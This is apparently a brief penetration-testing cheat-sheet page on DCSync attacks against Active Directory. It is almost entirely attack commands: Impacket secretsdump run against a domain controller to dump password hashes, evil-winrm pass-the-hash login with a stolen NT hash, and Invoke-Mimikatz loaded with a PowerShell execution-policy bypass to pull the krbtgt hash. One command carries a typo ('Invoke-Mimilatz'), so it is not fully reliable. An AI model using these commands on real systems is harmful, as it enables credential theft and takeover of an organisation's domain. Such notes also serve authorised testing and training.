# DCSync

...



<figure><img src="../../../.gitbook/assets/image (228).png" alt=""><figcaption></figcaption></figure>

## Impacket-secretsdump DCSync

```bash
locate secretsdump.py
cp /PATH/TO/secretsdump.py .

./secretsdump.py 'DOMAIN'/'USER':'PASS'@'DC'
```

Use the retrived NTLM hash to perform a Pass-the-Hash.

```bash
evil-winrm -u $USER_ACCOUNT -H $NT_HASH -i $HOST_IP
```



## Mimikatz DCSync

<pre class="language-powershell"><code class="lang-powershell"><strong>powershell -ep bypass
</strong><strong>. .\Invoke-Mimikatz.ps1
</strong><strong>
</strong><strong>Invoke-Mimilatz -Command '"lsadump::dcsync /user:$DOMAIN\krbtgt"'
</strong></code></pre>
